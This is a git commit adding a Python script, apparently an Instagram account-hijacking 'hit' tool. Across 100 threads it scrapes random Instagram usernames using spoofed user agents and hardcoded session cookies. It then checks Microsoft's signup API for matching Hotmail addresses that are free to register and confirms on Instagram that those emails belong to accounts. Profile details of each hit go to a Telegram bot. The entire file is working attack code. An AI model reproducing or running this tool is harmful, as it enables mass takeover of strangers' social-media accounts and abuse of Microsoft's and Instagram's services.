1dcac88dcea0c79b44ce9caf0fe0aa41fdde9021
Test <154968597+sahil-201ai@users.noreply.github.com>
2024-09-07 20:50:23 +0330

    Add files via upload

---
+++ Mori.py
@@ -0,0 +1,289 @@
+#---------------------[MORTADA]----------------------#
+import requests
+import random 
+from rich.panel import Panel as nel
+from rich import print as cetak
+import os
+from random import *
+from user_agent import generate_user_agent
+import time
+from faker import Faker
+from hashlib import md5
+import requests,re,random,os,sys
+from rich import print as g
+from rich.panel import Panel
+from threading import Thread
+#---------------------[MORTADA]----------------------#
+q=0
+w=0
+e=0
+a=0
+#---------------------[MORTADA]----------------------#
+E = '\033[1;31m'
+Z = '\033[1;31m'
+X = '\033[1;33m'
+F = '\033[2;32m'
+C = "\033[2;35m"
+B = '\033[2;36m'
+Y = '\033[1;34m'
+M = '\x1b[1;37m'
+S = '\033[1;33m'
+U = '\x1b[1;37m'
+BRed = '\x1b[1;31m'
+BGreen = '\x1b[1;32m'
+BYellow = '\x1b[1;33m'
+O = '\x1b[1;34m'
+R = '\x1b[1;35m'
+G = '\x1b[1;36m'
+BPurple = '\x1b[1;35m'
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a26 = '\x1b[38;5;5m'
+#---------------------[MORTADA]----------------------#
+Zz = [a26,G,O,R,Z,F,B,X]
+clor = random.choice(Zz)
+print(B + '▲────────────────◇◆◇────────────────▲         ')
+print('')
+print(E + 'تم صنع الاداه من قبل المطور مرتضى 🚯')
+print('')
+print(B + '▲────────────────◇◆◇────────────────▲          ')
+print('\x1b[2;36m✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧           \n\n  \x1b[38;5;210m➩ \x1b[1;33m[⚀]  \x1b[2;32mDEVELOPER  : مرتضى\n  \x1b[38;5;210m➩ \x1b[1;33m[⚁]  \x1b[2;32mMY CHANNEL : @MHND_X1\n  \x1b[38;5;210m➩ \x1b[1;33m[⚂]  \x1b[2;32mTOOL       : MORTADA\n  \x1b[38;5;210m➩ \x1b[1;33m[⚃]  \x1b[2;32mTELEGRAM   : @M_R_Q_P\n\x1b[2;36m\n✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧            ')
+#---------------------[MORTADA]----------------------#
+print(' ')
+print(f'{F}▭▬▭' * 20)
+print(' ')
+token = input(f"{Z}[{Z}?{Z}]{Z} TOKEN:{B}")
+print(' ')
+print(f'{B}▭▬▭' * 20)
+print(' ')
+iD = input(f"{F}[{F}?{F}]{F} ID:{F}")
+print(' ')
+print(f'{Z}▭▬▭' * 20)
+os.system('clear')
+#---------------------[MORTADA]----------------------#
+mmm = """
+ تم تشغيل اداه مرتضى - @M_R_Q_P ☠️
+ 
+ الرجاء ارسال صور صيد الى مرتضى 🚯
+ 
+ انتظر حتى الصيد 🚷
+ 
+ MORTADA - @M_R_Q_P
+"""
+requests.post(f"https://api.telegram.org/bot{token}/sendvideo?chat_id={iD}&video=https://t.me/dkdhdkdv/8&caption={mmm}")
+#---------------------[MORTADA]----------------------#
+def mortada(email):
+	global q,w,a,e
+	cookies = {
+	    'mkt': 'ar-EG',
+	    'MicrosoftApplicationsTelemetryDeviceId': '206044d2-af76-4747-8415-858b9a35af56',
+	    'MUID': '490d74a426a74a15b24b7fbd261f866e',
+	    '_pxvid': '2ecf5b70-645c-11ef-97bd-a836d19ff20e',
+	    'MSFPC': 'GUID=af3971cb0b414a2eacf63d08b91c0cb7&HASH=af39&LV=202408&V=4&LU=1724753240820',
+	    'logonLatency': 'LGN01=638613055843836599',
+	    'fptctx2': 'taBcrIH61PuCVH7eNCyH0FFaWZWIHTJWSYlBtG47cVvrdWDSP%252fMDNwK%252fetR%252f84Ky%252bZpMvHXLx6u7vyC6tHtVt%252fq13yn5hhewLonX9NmQ3d1owRasRyMdWTHFNJbjqXjIwxDx4v9pzHB%252fuGA%252bYHLCRCoxELIa9BGHp2VmVDlq1sbA%252bJQlD%252fE%252fU5U8xpirYQVY2CIkcY1JrPXHghsl8ZFmsDup%252bCmeStfSAPmVjbgiJzeSYiEs6CWGkWR%252fwXxVmNw08XODTKIA8WERGWZrRnkoWcdPlfJuGhqP5k%252bnkVPpFq%252biSplBknO2Gf8lMS4Zjk%252fpmHMsbKQgbdOHJm%252bD6DRUYA%253d%253d',
+	    'mkt1': 'ar-EG',
+	    'amsc': 'wX787iN2KxCzFsY083WTO3jFu6pKviBPEcqnXDFogytIY8ew+bLTK6i0JT0HpY2mGE2DWNp+1KEYixHkqajib8wQG0OGu1T3+NSqb5+j1ssJJSNX8SsGjKWl2Ceo2N/sZqou1hb94pzufqfXEQoUuqUABphlstEqnMJ42OVxa0CcTv4QLHU65WVBVKQKybiDut3B2DTuntJ8n1smjQeECwMTEioYr7ndJOTs4dw72kyYx/JX1/NsKgrR36Fm21TVi+gY6PM4DYm2L28D/j6da6wAoxxBqDdCdJNEZAJ6B/Rv8MVKZdixul9AX8VZIibt:2:3c',
+	    'ai_session': 'Fpyo1GOcv6mIkqhTUSFpJA|1725708787685|1725708787685',
+	    '_px3': '01904522c66e7c739d09b08cb2fedeec51a1a46b9a8261edf19f0b0554978c1a:xuZa+8xCfbokdsV7AzXqJz2A5X3SR76y/BqnS247fMM1wRYkbCrqYBbOkQ43XiIjmt3YfHJLm5IrKtdeIAhgMA==:1000:P+p8WiGSSAjeReGdO2LjREq/jJSR0PbhLa7ZJVRdDLmtghBkxoOJz94pjFkG8Xeoga7dD7ptc36XXij7rx8MoGWaexu5QPPYZ7EpulmZHIo7e0tZJZRNLx8ZI5J4BbfMdTy8WKYZMcySms8WR2e3V7VxT5i6V2f+tp0q3ZYK8okxqFR6U2avw3bzsvWrgnbE6RkSQtXGpeT/+1x2dU0YB4jOZzHZ9SdamIjTImmtd7A=',
+	    '_pxde': '30b92f279e465e907249d559df96c3608278aecf7ba0b2f8b83ab20fa5eb0a94:eyJ0aW1lc3RhbXAiOjE3MjU3MDg3OTIwNjMsImZfa2IiOjAsImlwY19pZCI6W119',
+	}
+	
+	headers = {
+	    'authority': 'signup.live.com',
+	    'accept': 'application/json',
+	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'canary': 'WtQ0WVYFajNHpODUQPPR1pPFHCLX3EmoCo0RLGzL8YMLl0+4SglJkM2AlRxNqoxaCGE+Q2C37nU7UJbgPz2GgIrFukcPEvTC5XG1evNtHx89Hi4YMelKqQ0HopWOm6jG2h5ItNpt9oaz5Yz1uaMmQO4glTcZRdt6TJWxRuN6L44+p7eR1Jg5mAhO6IdLdGmDyxvGt+ThpqWmPE82uI4ttmZQ2kdZ7iSNIgSGf+XwEtmTSyDVLUE+1pXz8Lh/sfAM:2:3c',
+	    'client-request-id': 'd90f85358965441fbaa43d8020f01c3f',
+	    'content-type': 'application/json; charset=utf-8',
+	    # 'cookie': 'mkt=ar-EG; MicrosoftApplicationsTelemetryDeviceId=206044d2-af76-4747-8415-858b9a35af56; MUID=490d74a426a74a15b24b7fbd261f866e; _pxvid=2ecf5b70-645c-11ef-97bd-a836d19ff20e; MSFPC=GUID=af3971cb0b414a2eacf63d08b91c0cb7&HASH=af39&LV=202408&V=4&LU=1724753240820; logonLatency=LGN01=638613055843836599; fptctx2=taBcrIH61PuCVH7eNCyH0FFaWZWIHTJWSYlBtG47cVvrdWDSP%252fMDNwK%252fetR%252f84Ky%252bZpMvHXLx6u7vyC6tHtVt%252fq13yn5hhewLonX9NmQ3d1owRasRyMdWTHFNJbjqXjIwxDx4v9pzHB%252fuGA%252bYHLCRCoxELIa9BGHp2VmVDlq1sbA%252bJQlD%252fE%252fU5U8xpirYQVY2CIkcY1JrPXHghsl8ZFmsDup%252bCmeStfSAPmVjbgiJzeSYiEs6CWGkWR%252fwXxVmNw08XODTKIA8WERGWZrRnkoWcdPlfJuGhqP5k%252bnkVPpFq%252biSplBknO2Gf8lMS4Zjk%252fpmHMsbKQgbdOHJm%252bD6DRUYA%253d%253d; mkt1=ar-EG; amsc=wX787iN2KxCzFsY083WTO3jFu6pKviBPEcqnXDFogytIY8ew+bLTK6i0JT0HpY2mGE2DWNp+1KEYixHkqajib8wQG0OGu1T3+NSqb5+j1ssJJSNX8SsGjKWl2Ceo2N/sZqou1hb94pzufqfXEQoUuqUABphlstEqnMJ42OVxa0CcTv4QLHU65WVBVKQKybiDut3B2DTuntJ8n1smjQeECwMTEioYr7ndJOTs4dw72kyYx/JX1/NsKgrR36Fm21TVi+gY6PM4DYm2L28D/j6da6wAoxxBqDdCdJNEZAJ6B/Rv8MVKZdixul9AX8VZIibt:2:3c; ai_session=Fpyo1GOcv6mIkqhTUSFpJA|1725708787685|1725708787685; _px3=01904522c66e7c739d09b08cb2fedeec51a1a46b9a8261edf19f0b0554978c1a:xuZa+8xCfbokdsV7AzXqJz2A5X3SR76y/BqnS247fMM1wRYkbCrqYBbOkQ43XiIjmt3YfHJLm5IrKtdeIAhgMA==:1000:P+p8WiGSSAjeReGdO2LjREq/jJSR0PbhLa7ZJVRdDLmtghBkxoOJz94pjFkG8Xeoga7dD7ptc36XXij7rx8MoGWaexu5QPPYZ7EpulmZHIo7e0tZJZRNLx8ZI5J4BbfMdTy8WKYZMcySms8WR2e3V7VxT5i6V2f+tp0q3ZYK8okxqFR6U2avw3bzsvWrgnbE6RkSQtXGpeT/+1x2dU0YB4jOZzHZ9SdamIjTImmtd7A=; _pxde=30b92f279e465e907249d559df96c3608278aecf7ba0b2f8b83ab20fa5eb0a94:eyJ0aW1lc3RhbXAiOjE3MjU3MDg3OTIwNjMsImZfa2IiOjAsImlwY19pZCI6W119',
+	    'correlationid': 'd90f85358965441fbaa43d8020f01c3f',
+	    'hpgact': '0',
+	    'hpgid': '200225',
+	    'origin': 'https://signup.live.com',
+	    'referer': 'https://signup.live.com/signup?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=8FBF1377C68D6487&opid=ED6EBAE32E9E7C00&bk=1725708784&sru=https://login.live.com/login.srf%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26contextid%3d8FBF1377C68D6487%26opid%3dED6EBAE32E9E7C00%26mkt%3dAR-EG%26lc%3d3073%26bk%3d1725708784%26uaid%3dd90f85358965441fbaa43d8020f01c3f&lw=dob,flname,wld&fl=1&uiflavor=web&lic=1&mkt=AR-EG&lc=3073&uaid=d90f85358965441fbaa43d8020f01c3f',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': str(generate_user_agent()),
+	}
+	
+	json_data = {
+	    'includeSuggestions': True,
+	    'signInName': f'{email}@hotmail.com',
+	    'uiflvr': 1001,
+	    'scid': 100118,
+	    'uaid': 'd90f85358965441fbaa43d8020f01c3f',
+	    'hpgid': 200225,
+	}
+	
+	response = requests.post(
+	    'https://signup.live.com/API/CheckAvailableSigninNames?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=8FBF1377C68D6487&opid=ED6EBAE32E9E7C00&bk=1725708784&sru=https://login.live.com/login.srf%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26contextid%3d8FBF1377C68D6487%26opid%3dED6EBAE32E9E7C00%26mkt%3dAR-EG%26lc%3d3073%26bk%3d1725708784%26uaid%3dd90f85358965441fbaa43d8020f01c3f&lw=dob,flname,wld&fl=1&uiflavor=web&lic=1&mkt=AR-EG&lc=3073&uaid=d90f85358965441fbaa43d8020f01c3f',
+	    cookies=cookies,
+	    headers=headers,
+	    json=json_data,
+	).text
+	
+	if '"isAvailable":true' in response:
+#---------------------[MORTADA]----------------------#
+		q+=1
+		print(f'{X} - Ok {a} | Good insta {q} | Bad Insta {w} | Bad Hotmail {e}')
+		cookies = {
+		    'csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
+		    'ig_did': '394458D6-565A-48F0-BFBB-CB75FD177F49',
+		    'ig_nrcb': '1',
+		    'dpr': '2.25',
+		    'mid': 'ZsqbPgABAAFrLhyT_amwiK59BNv4',
+		    'datr': 'PpvKZjhMQN858xPWY13-suQ2',
+		    'wd': '480x919',
+		}
+		
+		headers = {
+		    'authority': 'www.instagram.com',
+		    'accept': '*/*',
+		    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+		    'content-type': 'application/x-www-form-urlencoded',
+		    'origin': 'https://www.instagram.com',
+		    'referer': 'https://www.instagram.com/accounts/signup/email/',
+		    'sec-ch-prefers-color-scheme': 'dark',
+		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+		    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+		    'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-model': '"RMX3511"',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-ch-ua-platform-version': '"13.0.0"',
+		    'sec-fetch-dest': 'empty',
+		    'sec-fetch-mode': 'cors',
+		    'sec-fetch-site': 'same-origin',
+		    'user-agent': generate_user_agent(),
+		    'x-asbd-id': '129477',
+		    'x-csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
+		    'x-ig-app-id': '1217981644879628',
+		    'x-ig-www-claim': '0',
+		    'x-instagram-ajax': '1015960818',
+		    'x-requested-with': 'XMLHttpRequest',
+		}
+		
+		data = {
+		    'email': f'{email}@hotmail.com',
+		}
+		
+		res = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', cookies=cookies, headers=headers, data=data)
+		
+		if "email_is_taken" in res.text:
+#---------------------[MORTADA]-------------------#			
+			a+=1
+			print(f'{X} - Ok {a} | Good insta {q} | Bad Insta {w} | Bad Hotmail {e}')
+			cookies = {
+			    'csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
+			    'ig_did': '394458D6-565A-48F0-BFBB-CB75FD177F49',
+			    'ig_nrcb': '1',
+			    'dpr': '2.25',
+			    'mid': 'ZsqbPgABAAFrLhyT_amwiK59BNv4',
+			    'datr': 'PpvKZjhMQN858xPWY13-suQ2',
+			    'wd': '480x919',
+			}
+			
+			headers = {
+			    'authority': 'www.instagram.com',
+			    'accept': '*/*',
+			    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+			    'referer': 'https://www.instagram.com/shbs/',
+			    'sec-ch-prefers-color-scheme': 'dark',
+			    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+			    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+			    'sec-ch-ua-mobile': '?1',
+			    'sec-ch-ua-model': '"RMX3511"',
+			    'sec-ch-ua-platform': '"Android"',
+			    'sec-ch-ua-platform-version': '"13.0.0"',
+			    'sec-fetch-dest': 'empty',
+			    'sec-fetch-mode': 'cors',
+			    'sec-fetch-site': 'same-origin',
+			    'user-agent': str(generate_user_agent()),
+			    'x-asbd-id': '129477',
+			    'x-csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
+			    'x-ig-app-id': '1217981644879628',
+			    'x-ig-www-claim': '0',
+			    'x-requested-with': 'XMLHttpRequest',
+			}
+			
+			params = {
+			    'username': email,
+			}
+			
+			mhand = response = requests.get(
+			    'https://www.instagram.com/api/v1/users/web_profile_info/',
+			    params=params,
+			    cookies=cookies,
+			    headers=headers,
+			).json()		
+			name = mhand['data']['user']['full_name']
+			bio = mhand['data']['user']['biography']
+			fols = mhand['data']['user']['edge_followed_by']['count']
+			flog = mhand['data']['user']['edge_follow']['count']
+			id = mhand['data']['user']['id']
+			pr = mhand['data']['user']['is_private']
+			rqq = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
+			data = rqq.json()['date']
+#---------------------[MORTADA]------------------#			
+			tlg = f'''
+
+hit insta 		
+▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+🔀name : {name}
+☣️user : {email}
+✅email : {email}@hotmail.com
+🆕Followers : {fols}
+💀Following : {flog}
+👁Data : {data} 
+⚠️ID : {id}
+👩🏻‍💻Link : https://www.instagram.com/{email}
+🇮🇶program : mortada - @M_R_Q_P 🚸
+▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
+							'''
+		
+			requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={iD}&text={tlg}')
+#---------------------[MORTADA]------------------#			
+		else:
+			w+=1
+		
+			print(f'{X} - Ok {a} | Good insta {q} | Bad Insta {w} | Bad Hotmail {e}')
+	else:
+		e+=1
+		print(f'{X} - Ok {a} | Good insta {q} | Bad Insta {w} | Bad Hotmail {e}')
+
+
+#---------------------[MORTADA]----------------------#
+def X2():
+  while True:
+    try:
+      lsd=''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
+      id=str(randrange(10000,739988755))
+      headers = {
+      'accept': '*/*',
+      'accept-language': 'en-US,en;q=0.9',
+      'content-type': 'application/x-www-form-urlencoded',
+      'origin': 'https://www.instagram.com',
+      'referer': 'https://www.instagram.com/0s9s/',
+      'user-agent': str(generate_user_agent()),
+      'x-fb-lsd': 'mortada'+lsd,
+  }
+      data = {
+      'lsd': 'mortada'+lsd,
+      'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
+      'doc_id': '7397388303713986',
+  }
+      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
+      email=username
+      mortada(email)
+    except:''
+from threading import Thread
+for _ in range(100):
+  Thread(target=X2).start()
+#---------------------[MORTADA]----------------------#
